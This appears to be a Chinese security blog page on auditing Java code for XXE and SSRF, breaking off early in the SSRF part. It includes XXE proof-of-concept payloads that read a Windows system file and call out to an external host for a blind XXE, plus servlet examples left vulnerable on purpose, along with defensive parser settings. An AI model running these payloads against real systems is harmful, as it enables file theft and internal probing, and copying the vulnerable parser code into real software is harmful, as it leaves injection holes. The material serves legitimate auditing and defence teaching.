@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="2018-09-19 首发于阿里先知: https://xz.aliyun.com/t/2761 一、XXE0x01 XXE漏洞简介XXE（XML外部实体注入，XML External Entity) ，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。Java中的XXE支持sun.net.www">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JAVA代码审计之XXE与SSRF">
+<meta property="og:url" content="http://yoursite.com/2018/09/19/JAVA代码审计之XXE与SSRF/index.html">
+<meta property="og:site_name" content="pplsec">
+<meta property="og:description" content="2018-09-19 首发于阿里先知: https://xz.aliyun.com/t/2761 一、XXE0x01 XXE漏洞简介XXE（XML外部实体注入，XML External Entity) ，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。Java中的XXE支持sun.net.www">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180918232137-894680ae-bb56-1.png">
+<meta property="og:updated_time" content="2018-09-19T01:38:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="JAVA代码审计之XXE与SSRF">
+<meta name="twitter:description" content="2018-09-19 首发于阿里先知: https://xz.aliyun.com/t/2761 一、XXE0x01 XXE漏洞简介XXE（XML外部实体注入，XML External Entity) ，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。Java中的XXE支持sun.net.www">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180918232137-894680ae-bb56-1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/19/JAVA代码审计之XXE与SSRF/">
+
+
+
+
+
+  <title>JAVA代码审计之XXE与SSRF | pplsec</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">pplsec</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">爱安全 爱生活</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/19/JAVA代码审计之XXE与SSRF/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">JAVA代码审计之XXE与SSRF</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-19T09:38:36+08:00">
+                2018-09-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>2018-09-19 首发于阿里先知: <a href="https://xz.aliyun.com/t/2761" target="_blank" rel="noopener">https://xz.aliyun.com/t/2761</a></p>
+<h3 id="一、XXE"><a href="#一、XXE" class="headerlink" title="一、XXE"></a>一、XXE</h3><h4 id="0x01-XXE漏洞简介"><a href="#0x01-XXE漏洞简介" class="headerlink" title="0x01 XXE漏洞简介"></a>0x01 XXE漏洞简介</h4><p>XXE（XML外部实体注入，XML External Entity) ，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。Java中的XXE支持sun.net.<a href="http://www.protocol" target="_blank" rel="noopener">www.protocol</a> 里的所有协议：http，https，file，ftp，mailto，jar，netdoc。一般利用file协议读取文件，利用http协议探测内网，没有回显时可组合利用file协议和ftp协议来读取文件。</p>
+<h4 id="0x02-XXE相关基础概念"><a href="#0x02-XXE相关基础概念" class="headerlink" title="0x02 XXE相关基础概念"></a>0x02 XXE相关基础概念</h4><h5 id="XML-amp-DTD"><a href="#XML-amp-DTD" class="headerlink" title="XML&amp;DTD"></a>XML&amp;DTD</h5><p>XML （可扩展标记语言，EXtensible Markup Language），是一种标记语言，用来传输和存储数据，而非显示数据。<br>DTD（文档类型定义，Document Type Definition）的作用是定义 XML 文档的合法构建模块。它使用一系列的合法元素来定义文档结构。</p>
+<h5 id="实体ENTITY"><a href="#实体ENTITY" class="headerlink" title="实体ENTITY"></a>实体ENTITY</h5><p>XML中的实体类型，一般有下面几种：字符实体、命名实体（或内部实体）、外部普通实体、外部参数实体。除外部参数实体外，其它实体都以字符（&amp;）开始，以字符（;）结束。</p>
+<h6 id="1-字符实体"><a href="#1-字符实体" class="headerlink" title="1)字符实体"></a>1)字符实体</h6><p>字符实体类似html中的实体编码，形如：&#97;（十进制）或者&#x61;（十六进制）。</p>
+<h6 id="2-命名实体（内部实体）"><a href="#2-命名实体（内部实体）" class="headerlink" title="2)命名实体（内部实体）"></a>2)命名实体（内部实体）</h6><p>内部实体又称为命名实体。命名实体可以说成是变量声明，命名实体只能声明在DTD或者XML文件开始部分（&lt;!DOCTYPE&gt;语句中）。<br>命名实体（或内部实体）语法：<br><figure class="highlight plain"><figcaption><span>实体名称 "实体的值">```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如：</span><br></pre></td></tr></table></figure></p>
+<p>&lt;?xml version=”1.0” encoding=”utf-8”?&gt;<br>&lt;!DOCTYPE root [<br>    &lt;!ENTITY x “First Param!”&gt;<br>    &lt;!ENTITY y “Second Param!”&gt;<br>]&gt;</p>
+<p><root><x>&x;</x><y>&y;</y></root><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">定义一个实体名称x 值为First Param!</span><br><span class="line">&amp;x;  引用实体x</span><br><span class="line"></span><br><span class="line">###### 3)外部普通实体 </span><br><span class="line">外部实体用于加载外部文件的内容。（显式XXE攻击主要利用外部普通实体）</span><br><span class="line">外部普通实体语法：</span><br><span class="line">```&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPe root [</span><br><span class="line">    &lt;!ENTITY outfile SYSTEM &quot;outfile.xml&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;outfile&gt;&amp;outfile;&lt;/outfile&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
+<h6 id="4-外部参数实体"><a href="#4-外部参数实体" class="headerlink" title="4)外部参数实体"></a>4)外部参数实体</h6><p>参数实体用于DTD和文档的内部子集中。与一般实体不同，是以字符（%）开始，以字符（;）结束。只有在DTD文件中才能在参数实体声明的时候引用其他实体。（Blind XXE攻击常利用参数实体进行数据回显）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY % param1 &quot;Hello&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % param2 &quot; &quot;&gt;</span><br><span class="line">    &lt;!ENTITY % param3 &quot;World&quot;&gt;</span><br><span class="line">    &lt;!ENTITY dtd SYSTEM &quot;combine.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;foo&gt;&amp;content&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
+<p>combine.dtd中的内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY content &quot;%param1;%param2;%param3;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>上面combine.dtd中定义了一个基本实体，引用了3个参数实体：%param1;，%param2;，%param3;。<br>解析后<foo>…</foo>中的内容为Hello World。</p>
+<h4 id="0x03-XXE审计函数"><a href="#0x03-XXE审计函数" class="headerlink" title="0x03 XXE审计函数"></a>0x03 XXE审计函数</h4><p>XML解析一般在导入配置、数据传输接口等场景可能会用到，涉及到XML文件处理的场景可查看XML解析器是否禁用外部实体，从而判断是否存在XXE。部分XML解析接口如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br><span class="line">…………</span><br></pre></td></tr></table></figure></p>
+<h4 id="0x04-常用测试POC"><a href="#0x04-常用测试POC" class="headerlink" title="0x04 常用测试POC"></a>0x04 常用测试POC</h4><h5 id="POC1-外部普通实体"><a href="#POC1-外部普通实体" class="headerlink" title="POC1-外部普通实体"></a>POC1-外部普通实体</h5><p>当有回显时，利用ftp协议来读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lltest[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure></p>
+<h5 id="POC2-外部参数实体"><a href="#POC2-外部参数实体" class="headerlink" title="POC2-外部参数实体"></a>POC2-外部参数实体</h5><p>无回显时 利用http协议来发起请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note[ </span><br><span class="line">&lt;!ENTITY % lltest SYSTEM &quot;http://***.***.***.***:7777/lltest_xxe666&quot;&gt;</span><br><span class="line">%lltest;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="0X05-XXE漏洞代码示例"><a href="#0X05-XXE漏洞代码示例" class="headerlink" title="0X05 XXE漏洞代码示例"></a>0X05 XXE漏洞代码示例</h4><p>解析XML的方法越来越多，常见有四种，即：DOM、DOM4J、JDOM 和SAX。下面以这四种为例展示XXE漏洞。</p>
+<h5 id="1-DOM-Read-XML"><a href="#1-DOM-Read-XML" class="headerlink" title="1) DOM Read XML"></a>1) DOM Read XML</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;		</span><br><span class="line">       String result=&quot;&quot;;</span><br><span class="line">	try &#123;</span><br><span class="line">		//DOM Read XML</span><br><span class="line">		DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();     </span><br><span class="line">        DocumentBuilder db = dbf.newDocumentBuilder();					</span><br><span class="line">		Document doc = db.parse(request.getInputStream());</span><br><span class="line">		</span><br><span class="line">		String username = getValueByTagName(doc,&quot;username&quot;);</span><br><span class="line">		String password = getValueByTagName(doc,&quot;password&quot;);</span><br><span class="line">		if(username.equals(USERNAME) &amp;&amp; password.equals(PASSWORD))&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,username);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,username);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; catch (ParserConfigurationException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">		result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,e.getMessage());</span><br><span class="line">	&#125; catch (SAXException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">		result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,e.getMessage());</span><br><span class="line">	&#125;</span><br><span class="line">	response.setContentType(&quot;text/xml;charset=UTF-8&quot;);</span><br><span class="line">	response.getWriter().append(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="2-DOM4J-Read-XML"><a href="#2-DOM4J-Read-XML" class="headerlink" title="2) DOM4J Read XML"></a>2) DOM4J Read XML</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;		    </span><br><span class="line">       String result=&quot;&quot;;</span><br><span class="line">	try &#123;</span><br><span class="line">		//DOM4J Read XML</span><br><span class="line">		SAXReader saxReader = new SAXReader();</span><br><span class="line">		Document document = saxReader.read(request.getInputStream());</span><br><span class="line">		 </span><br><span class="line">	    String username = getValueByTagName2(document,&quot;username&quot;);</span><br><span class="line">		String password = getValueByTagName2(document,&quot;password&quot;);</span><br><span class="line">		 </span><br><span class="line">		if(username.equals(USERNAME) &amp;&amp; password.equals(PASSWORD))&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,username);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,username);</span><br><span class="line">		&#125;		 		 </span><br><span class="line">		</span><br><span class="line">	&#125; catch (DocumentException  e) &#123;</span><br><span class="line">		System.out.println(e.getMessage());</span><br><span class="line">	&#125; </span><br><span class="line">	response.setContentType(&quot;text/xml;charset=UTF-8&quot;);</span><br><span class="line">	response.getWriter().append(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="3-JDOM2-Read-XML"><a href="#3-JDOM2-Read-XML" class="headerlink" title="3) JDOM2 Read XML"></a>3) JDOM2 Read XML</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;		       </span><br><span class="line">       String result=&quot;&quot;;</span><br><span class="line">	try &#123;</span><br><span class="line">		//JDOM2 Read XML	</span><br><span class="line">		SAXBuilder builder = new SAXBuilder();	</span><br><span class="line">	    Document document = builder.build(request.getInputStream());</span><br><span class="line">		 </span><br><span class="line">	    String username = getValueByTagName3(document,&quot;username&quot;);</span><br><span class="line">		String password = getValueByTagName3(document,&quot;password&quot;);</span><br><span class="line">		 </span><br><span class="line">		if(username.equals(USERNAME) &amp;&amp; password.equals(PASSWORD))&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,username);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,username);</span><br><span class="line">		&#125;</span><br><span class="line">		 </span><br><span class="line">	&#125; catch (JDOMException  e) &#123;</span><br><span class="line">		System.out.println(e.getMessage());</span><br><span class="line">	&#125; </span><br><span class="line">	response.setContentType(&quot;text/xml;charset=UTF-8&quot;);</span><br><span class="line">	response.getWriter().append(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="4-SAX-Read-XML"><a href="#4-SAX-Read-XML" class="headerlink" title="4) SAX Read XML"></a>4) SAX Read XML</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;		</span><br><span class="line">	//https://blog.csdn.net/u011024652/article/details/51516220</span><br><span class="line">	String result=&quot;&quot;;</span><br><span class="line">	try &#123;</span><br><span class="line">		//SAX Read XML</span><br><span class="line">		SAXParserFactory factory  = SAXParserFactory.newInstance(); </span><br><span class="line">		SAXParser saxparser = factory.newSAXParser();  </span><br><span class="line">		SAXHandler handler = new SAXHandler();  </span><br><span class="line">		saxparser.parse(request.getInputStream(), handler);</span><br><span class="line">		//为简单，没有提取子元素中的数据，只要调用parse()解析xml就已经触发xxe漏洞了</span><br><span class="line">           //没有回显  blind xxe</span><br><span class="line">		 result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,1);</span><br><span class="line"></span><br><span class="line">	&#125; catch (ParserConfigurationException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">		result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,e.getMessage());</span><br><span class="line">	&#125; catch (SAXException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">		result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,e.getMessage());</span><br><span class="line">	&#125;</span><br><span class="line">	response.setContentType(&quot;text/xml;charset=UTF-8&quot;);</span><br><span class="line">	response.getWriter().append(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="0x06-XXE漏洞防御"><a href="#0x06-XXE漏洞防御" class="headerlink" title="0x06 XXE漏洞防御"></a>0x06 XXE漏洞防御</h5><p>使用XML解析器时需要设置其属性，禁用DTDs或者禁止使用外部实体。</p>
+<p>以上例中DOM - DocumentBuilderFactory为例，防御代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); //禁用DTDs (doctypes),几乎可以防御所有xml实体攻击</span><br><span class="line">//如果不能禁用DTDs,可以使用下两项，必须两项同时存在</span><br><span class="line">dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);      //防止外部普通实体POC 攻击</span><br><span class="line">dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);   //防止外部参数实体POC攻击</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180918232137-894680ae-bb56-1.png" alt=""><br>其它XML解析器的漏洞防御可参考<br><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java</a></p>
+<p>上述XXE漏洞与防御完整示例代码 已上传Github  详见 <a href="https://github.com/pplsec/JavaVul/tree/master/MyXXE" target="_blank" rel="noopener">https://github.com/pplsec/JavaVul/tree/master/MyXXE</a></p>
+<h3 id="二、SSRF"><a href="#二、SSRF" class="headerlink" title="二、SSRF"></a>二、SSRF</h3><h4 id="0x01-SSRF漏洞简介"><a href="#0x01-SSRF漏洞简介" class="headerlink" title="0x01 SSRF漏洞简介"></a>0x01 SSRF漏洞简介</h4><p>SSRF(Server-Side Request Forge, 服务端请求伪造)，攻击者让服务端发起指定的请求，SSRF攻击的目标一般是从外网无法访问的内网系统。Java中的SSRF支持sun.net.<a href="http://www.protocol" target="_blank" rel="noopener">www.protocol</a> 里的所有协议:http，https，file，ftp，mailto，jar，netdoc。相对于php，在java中SSRF的利用局限较大，一般利用http协议来探测端口，利用file协议读取任意文件。</p>
